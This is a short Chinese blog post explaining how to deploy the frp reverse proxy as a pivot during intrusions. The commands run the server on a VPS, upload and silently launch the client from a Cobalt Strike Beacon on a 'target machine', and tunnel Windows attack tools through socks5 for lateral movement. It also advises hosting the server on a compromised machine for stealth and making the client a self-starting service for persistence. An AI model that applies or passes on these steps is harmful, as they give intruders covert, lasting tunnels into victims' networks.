# frp


下载地址：https://github.com/fatedier/frp.git

跨平台，根据自己情况选择使用



### 配置文件

#### 服务端

<img src="http://image.xpshuai.cn/frp1.png"></img>

#### 客户端

<img src="http://image.xpshuai.cn/frp2.jpg"></img>





### 部署

#### 服务端

连接到vps上，后台启动服务端

```bash
nohup ./frps -c frps.int &
jobs -l 
cat frps.log
```

#### 客户端

将`frpc.exe`与`frpc.ini`传到目标机的同一目录下，直接运行

```bash
frpc.exe -c frpc.int
```

当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到


但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，

所以可结合execute在目标机无输出执行程序。

```bash
sleep 10
execute c:/frpc.exe -c c:/frpc.ini
shell netstat -ano |findstr 7007

```



#### Windows

Windows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。





>
>Frp的用法比较灵活且运行稳定。如可将frp服务端挂在"肉鸡"上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。





---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/frp/  

